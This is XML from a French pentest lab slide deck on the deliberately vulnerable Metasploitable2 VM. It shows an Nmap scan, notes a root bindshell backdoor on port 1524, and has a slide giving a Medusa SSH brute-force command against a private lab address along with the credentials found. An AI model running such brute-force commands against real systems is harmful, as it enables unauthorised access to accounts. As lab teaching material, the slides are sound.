                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ancien</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>algorithmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>clés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>obsolètes</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600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="E11D48"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Port 1524 · </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>bindshell</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600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→ « </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> root shell », backdoor sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>authentification</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Google Shape;141;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5907025" y="1114523"/>
            <a:ext cx="5833800" cy="4615200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3005"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>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42" name="Google Shape;142;p7" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig01_nmap.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989325" y="1114525"/>
            <a:ext cx="5669274" cy="4492750"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Google Shape;143;p7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989324" y="5729839"/>
            <a:ext cx="5833800" cy="292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Résultat du scan Nmap (-sV) sur Metasploitable2</a:t>
            </a:r>
            <a:endParaRPr sz="1050" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144" name="Google Shape;144;p7"/>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a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>05</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{88EC56B8-04E5-BCDA-6752-795239F666B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="579119" y="187890"/>
            <a:ext cx="6873867" cy="5390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
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="138"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13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9"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="139"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13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0"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="140"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="16" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="14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nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="142"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="21" dur="2000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="142"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                              <p:par>
                                <p:cTn id="22" presetID="21" presetClass="entr" presetSubtype="1" fill="hold" grpId="0" nodeType="withEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="143"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wheel(1)">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="20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p:bldP spid="139" grpId="0"/>
      <p:bldP spid="140" grpId="0"/>
      <p:bldP spid="14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9"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p8"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Brute force SSH : Hydra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>échoue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>, Medusa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>réussit</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="152" name="Google Shape;152;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="960120" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="96012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DÉFI</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1645920" y="1463040"/>
            <a:ext cx="502920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200"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Hydra : kex error — no match for method server host key algo</a:t>
            </a:r>
            <a:endParaRPr sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="155" name="Google Shape;155;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="5394960" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="136000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Kali (moderne) et Metasploitable2 (OpenSSH 4.7p1) ne partagent plus d'algorithme de négociation SSH commun : Hydra ne permet pas, en ligne de commande, d'imposer les anciens algorithmes.</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="156" name="Google Shape;156;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3246120"/>
            <a:ext cx="1280160" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3246120"/>
            <a:ext cx="128016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SOLUTION</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1920240" y="3246120"/>
            <a:ext cx="4114800" cy="31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200"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Medusa négocie correctement les anciens algorithmes SSH</a:t>
            </a:r>
            <a:endParaRPr sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3749040"/>
            <a:ext cx="5394960" cy="4114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60000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>medusa -u msfadmin -P rockyou.txt -h 192.168.56.105 -M ssh</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Résultat : ACCOUNT FOUND — msfadmin / msfadmin</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="228600" marR="0" lvl="0" indent="-228600" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Compte compromis : mot de passe identique au login, faille classique</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="1514228"/>
            <a:ext cx="5559552" cy="4789664"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1336"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F1F5F9"/>
          </a:solidFill>
          <a:ln w="22225" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="0E9E5E"/>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1" name="Google Shape;161;p8" descr="/sessions/intelligent-upbeat-noether/mnt/outputs/pptx_images/fig03_medusa_success.jpg"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
